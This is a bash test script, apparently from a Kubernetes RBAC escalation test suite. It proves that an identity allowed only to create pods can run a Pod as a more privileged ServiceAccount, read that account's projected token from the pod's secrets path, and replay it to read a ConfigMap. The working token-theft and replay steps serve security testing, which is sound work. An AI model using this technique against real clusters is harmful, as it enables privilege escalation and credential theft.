#!/usr/bin/env bash
# Identity assumption: create Pod (as a ServiceAccount) -> act as the SA  (create-pod-assumes-sa)
#
# Proof: an identity granted ONLY `create pods` (not `get configmaps`) can run a
# Pod as a ServiceAccount that may `get configmaps`; the kubelet projects the
# SA's token into the Pod, and replaying it reads the ConfigMap as the SA.
# Mechanism: ../transitions/create-pod-assumes-sa.md
source "$(dirname "$0")/../lib.sh"
test_start "create-pod-assumes-sa"

ns="$(new_ns pod-sa)"
cm_val="cfg-${RUN_ID}"

# Victim SA that CAN get configmaps, and a target ConfigMap.
step "admin creates victim-sa (may get configmaps) and ConfigMap 'target'"
mk_sa "$ns" victim-sa
grant_ns "$ns" victim-sa "" "configmaps" "get,list"
K -n "$ns" create configmap target --from-literal=key="$cm_val" >/dev/null || fail "could not create configmap"

# Attacker SA: ONLY `create pods` (+ get pods). NOT get configmaps.
mk_sa "$ns" attacker
grant_ns "$ns" attacker "" "pods" "create,get,list"
subj="$(sa_subject "$ns" attacker)"

# THE GAP: holds p (create pods) but not q (get configmaps).
assert_can    "$subj" create pods       "$ns"
assert_cannot "$subj" get    configmaps "$ns"

# ACT (as attacker, exercising ONLY p): create a Pod running as victim-sa.
step "attacker creates a Pod with serviceAccountName=victim-sa"
as_subj "$subj" -n "$ns" apply -f - >/dev/null <<EOF || fail "attacker could not create the pod"
apiVersion: v1
kind: Pod
metadata: { name: thief }
spec:
  serviceAccountName: victim-sa
  containers:
  - name: c
    image: ${IMG}
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 3600"]
EOF
wait_pod_running "$ns" thief 90

# EFFECT: the kubelet projected victim-sa's token into the Pod. Read it (admin
# observes; the attacker's in-pod code would) and replay it to get the ConfigMap.
tok="$(K -n "$ns" exec thief -- cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)"
assert_nonempty "$tok" "pod carries victim-sa's projected token"
got="$(ktoken "$tok" -n "$ns" get configmap target -o jsonpath='{.data.key}' 2>/dev/null)"
assert_eq "$got" "$cm_val" "attacker read the ConfigMap by replaying the pod's victim-sa token"
step "create pods let the attacker inherit victim-sa's get-configmaps"

test_pass
